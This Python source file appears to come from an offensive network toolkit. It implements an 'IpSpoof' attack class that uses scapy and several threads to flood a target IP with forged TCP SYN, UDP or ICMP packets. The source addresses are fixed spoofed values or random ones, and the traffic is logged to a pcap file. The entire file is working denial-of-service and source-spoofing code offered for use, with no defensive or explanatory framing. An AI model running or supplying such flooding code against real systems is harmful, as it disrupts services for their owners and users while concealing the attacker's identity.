import random, threading, time
from scapy.all import Ether, IP, TCP, UDP, ICMP, sendp, get_if_hwaddr
from attacks.base import BaseAttack


class IpSpoof(BaseAttack):
    def run(self):
        target_ip = self.params.get("target_ip", "")
        spoof_ip  = self.params.get("spoof_ip", "")
        proto     = self.params.get("proto", "tcp").lower()
        threads_n = int(self.params.get("threads", 4))

        if not target_ip:
            self.log("IP Spoof: no target IP", "error"); return
        if not spoof_ip:
            # random spoof per packet if not specified
            spoof_ip = None

        dst_mac  = self.resolve_mac(target_ip)
        src_mac  = get_if_hwaddr(self.iface)
        writer   = self.open_pcap()
        counters = {"sent": 0}
        lock     = threading.Lock()

        self.log(f"IP Spoof → {target_ip}  proto={proto}  spoof_src={'random' if not spoof_ip else spoof_ip}", "warn")

        def rand_ip():
            return f"{random.randint(1,254)}.{random.randint(0,254)}.{random.randint(0,254)}.{random.randint(1,254)}"

        def sender():
            while not self._stop.is_set():
                src = spoof_ip if spoof_ip else rand_ip()
                if proto == "tcp":
                    payload = (
                        Ether(src=src_mac, dst=dst_mac)
                        / IP(src=src, dst=target_ip, ttl=random.randint(32, 128))
                        / TCP(sport=random.randint(1024, 65535),
                              dport=random.randint(1, 1023),
                              flags="S", seq=random.randint(0, 0xFFFFFFFF))
                    )
                elif proto == "udp":
                    payload = (
                        Ether(src=src_mac, dst=dst_mac)
                        / IP(src=src, dst=target_ip, ttl=random.randint(32, 128))
                        / UDP(sport=random.randint(1024, 65535),
                              dport=random.randint(1, 1023))
                        / bytes(random.getrandbits(8) for _ in range(64))
                    )
                else:
                    payload = (
                        Ether(src=src_mac, dst=dst_mac)
                        / IP(src=src, dst=target_ip, ttl=random.randint(32, 128))
                        / ICMP(type=8, code=0)
                        / bytes(random.getrandbits(8) for _ in range(32))
                    )
                try:
                    sendp(payload, iface=self.iface, verbose=False)
                    with lock:
                        self.write(payload)
                        counters["sent"] += 1
                        n = counters["sent"]
                    if n % 500 == 0:
                        self.log(f"IP Spoof: {n:,} packets sent", "info")
                except Exception as e:
                    self.log(f"IP Spoof error: {e}", "error"); break

        workers = [threading.Thread(target=sender, daemon=True) for _ in range(threads_n)]
        for w in workers: w.start()
        for w in workers: w.join()
        writer.close()
